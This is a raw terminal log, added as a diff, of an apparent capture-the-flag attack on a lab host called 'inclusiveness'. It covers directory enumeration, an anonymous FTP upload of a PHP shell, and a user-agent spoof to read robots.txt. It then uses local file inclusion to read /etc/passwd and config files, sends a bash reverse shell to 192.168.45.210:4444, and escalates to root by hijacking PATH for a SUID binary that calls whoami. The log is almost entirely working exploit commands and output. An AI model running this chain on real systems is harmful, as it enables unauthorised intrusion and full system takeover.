@@ -1,0 +1,210 @@
+┌──(root㉿kali)-[/home/kali]
+└─# gobuster dir -u http://192.168.167.14 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html      
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.167.14
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php,txt,html
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.php                 (Status: 403) [Size: 279]
+/.hta.php             (Status: 403) [Size: 279]
+/.hta                 (Status: 403) [Size: 279]
+/.hta.html            (Status: 403) [Size: 279]
+/.htaccess.html       (Status: 403) [Size: 279]
+/.htaccess.php        (Status: 403) [Size: 279]
+/.htaccess.txt        (Status: 403) [Size: 279]
+/.hta.txt             (Status: 403) [Size: 279]
+/.htaccess            (Status: 403) [Size: 279]
+/.htpasswd.txt        (Status: 403) [Size: 279]
+/.htpasswd.php        (Status: 403) [Size: 279]
+/.htpasswd            (Status: 403) [Size: 279]
+/.htpasswd.html       (Status: 403) [Size: 279]
+/.html                (Status: 403) [Size: 279]
+/index.html           (Status: 200) [Size: 10701]
+/index.html           (Status: 200) [Size: 10701]
+/javascript           (Status: 301) [Size: 321] [--> http://192.168.167.14/javascript/]
+/manual               (Status: 301) [Size: 317] [--> http://192.168.167.14/manual/]
+/robots.txt           (Status: 200) [Size: 59]
+/robots.txt           (Status: 200) [Size: 59]
+/robots.txt.php       (Status: 200) [Size: 59]
+/robots.txt.txt       (Status: 200) [Size: 59]
+/robots.txt.html      (Status: 200) [Size: 59]
+/seo.html             (Status: 200) [Size: 59]
+/server-status        (Status: 403) [Size: 279]
+Progress: 18456 / 18460 (99.98%)
+===============================================================
+Finished
+===============================================================
+
+┌──(root㉿kali)-[/home/kali]
+└─# ftp 192.168.167.14 
+Connected to 192.168.167.14.
+220 (vsFTPd 3.0.3)
+Name (192.168.167.14:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+229 Entering Extended Passive Mode (|||10632|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 0        0            4096 Feb 08  2020 pub
+226 Directory send OK.
+ftp> cd pub
+250 Directory successfully changed.
+ftp> dir
+229 Entering Extended Passive Mode (|||59694|)
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp> put shell.php
+local: shell.php remote: shell.php
+229 Entering Extended Passive Mode (|||8742|)
+150 Ok to send data.
+100% |************************************************************************|    42       16.90 KiB/s    00:00 ETA
+226 Transfer complete.
+42 bytes sent in 00:00 (0.63 KiB/s)
+ftp> bye
+221 Goodbye.
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# curl http://192.168.167.14/robots.txt         
+You are not a search engine! You can't read my robots.txt!
+                                                                                                                     
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl -s -A "Googlebot/2.1 (+http://www.google.com/bot.html)" http://192.168.167.14/robots.txt
+User-agent: *
+Disallow: /secret_information/
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# curl http://192.168.167.14/secret_information/
+<title>zone transfer</title>
+
+<h2>DNS Zone Transfer Attack</h2>
+
+<p><a href='?lang=en.php'>english</a> <a href='?lang=es.php'>spanish</a></p>
+
+DNS Zone transfer is the process where a DNS server passes a copy of part of it's database (which is called a "zone") to another DNS server. It's how you can have more than one DNS server able to answer queries about a particular zone; there is a Master DNS server, and one or more Slave DNS servers, and the slaves ask the master for a copy of the records for that zone.
+
+A basic DNS Zone Transfer Attack isn't very fancy: you just pretend you are a slave and ask the master for a copy of the zone records. And it sends you them; DNS is one of those really old-school Internet protocols that was designed when everyone on the Internet literally knew everyone else's name and address, and so servers trusted each other implicitly.
+
+It's worth stopping zone transfer attacks, as a copy of your DNS zone may reveal a lot of topological information about your internal network. In particular, if someone plans to subvert your DNS, by poisoning or spoofing it, for example, they'll find having a copy of the real data very useful.
+
+So best practice is to restrict Zone transfers. At the bare minimum, you tell the master what the IP addresses of the slaves are and not to transfer to anyone else. In more sophisticated set-ups, you sign the transfers. So the more sophisticated zone transfer attacks try and get round these controls.
+
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+
+http://192.168.167.14/secret_information/?lang=en.php
+
+http://192.168.167.14/secret_information/?lang=../../../../../../etc/passwd
+
+tom:x:1000:1000:Tom,,,:/home/tom:/bin/bash
+
+# read common config files via php://filter LFI
+# vsftpd config
+curl -s 'http://192.168.167.14/secret_information/?lang=php://filter/convert.base64-encode/resource=/etc/vsftpd.conf' | grep -o '[A-Za-z0-9+/=]\{40,\}' | head -n1 | base64 -d | sed -n '1,200p'
+# apache vhost files for DocumentRoot
+curl -s 'http://192.168.167.14/secret_information/?lang=php://filter/convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf' | grep -o '[A-Za-z0-9+/=]\{40,\}' | head -n1 | base64 -d | sed -n '1,200p'
+
+
+
+http://192.168.167.14/secret_information/?lang=../../../../../etc/vsftpd.conf
+
+"anon_root=/var/ftp/ write_enable=YES #"
+
+
+http://192.168.167.14/secret_information/?lang=../../../../../../../../var/ftp/pub/shell.php&cmd=id
+
+192.168.167.14/secret_information/?lang=../../../../../../../../var/ftp/pub/shell.php&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.210%2F4444%200%3E%261%27
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444                          
+listening on [any] 4444 ...
+connect to [192.168.45.210] from (UNKNOWN) [192.168.167.14] 32834
+bash: cannot set terminal process group (603): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@inclusiveness:/var/www/html/secret_information$ 
+
+www-data@inclusiveness:/home/tom$ ls
+Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos  local.txt  rootshell  rootshell.c
+www-data@inclusiveness:/home/tom$ cat rootshell.c
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main() {
+
+    printf("checking if you are tom...\n");
+    FILE* f = popen("whoami", "r");
+
+    char user[80];
+    fgets(user, 80, f);
+
+    printf("you are: %s\n", user);
+    //printf("your euid is: %i\n", geteuid());
+
+    if (strncmp(user, "tom", 3) == 0) {
+        printf("access granted.\n");
+	setuid(geteuid());
+        execlp("sh", "sh", (char *) 0);
+    }
+}
+
+www-data@inclusiveness:/home/tom$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/chsh
+/usr/bin/bwrap
+/usr/bin/gpasswd
+/usr/bin/fusermount
+/usr/bin/chfn
+/usr/bin/ntfs-3g
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/pkexec
+/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/sbin/pppd
+/home/tom/rootshell
+www-data@inclusiveness:/home/tom$ 
+
+
+www-data@inclusiveness:/home/tom$ # create a controlled directory for a fake whoami
+www-data@inclusiveness:/home/tom$ mkdir -p /tmp/pwn
+www-data@inclusiveness:/home/tom$ cat > /tmp/pwn/whoami <<'W'
+> #!/bin/sh
+> # return tom followed by newline (mimic whoami)
+> printf "tom\n"
+> W
+www-data@inclusiveness:/home/tom$ chmod +x /tmp/pwn/whoami
+www-data@inclusiveness:/home/tom$ 
+www-data@inclusiveness:/home/tom$ # run the SUID binary with PATH prefixed so popen("whoami") runs our script
+www-data@inclusiveness:/home/tom$ PATH=/tmp/pwn:$PATH /home/tom/rootshell
+checking if you are tom...
+you are: tom
+
+access granted.
+# id 
+uid=0(root) gid=33(www-data) groups=33(www-data)
+# 
+
